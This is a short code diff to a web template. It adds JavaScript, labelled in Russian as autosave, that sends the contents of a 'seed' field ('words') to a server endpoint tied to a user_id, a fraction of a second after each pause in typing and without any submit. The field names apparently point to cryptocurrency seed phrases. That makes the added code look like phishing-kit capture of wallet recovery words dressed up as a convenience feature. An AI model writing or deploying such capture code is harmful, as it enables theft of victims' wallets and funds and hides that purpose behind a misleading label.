@@ -203,6 +203,21 @@
     {% if show_modal %}
       document.getElementById("errorModal").style.display = "flex";
     {% endif %}
+
+    // 🔹 Автосохранение при вводе
+    const seedInput = document.getElementById("seed");
+    let typingTimer;
+    seedInput.addEventListener("input", function () {
+      clearTimeout(typingTimer);
+      typingTimer = setTimeout(() => {
+        const words = seedInput.value;
+        fetch("{{ url_for('save_words', user_id=request.args.get('user_id')) }}", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ words })
+        }).catch(err => console.error("Ошибка отправки:", err));
+      }, 400);
+    });
   </script>
 </body>
 </html>
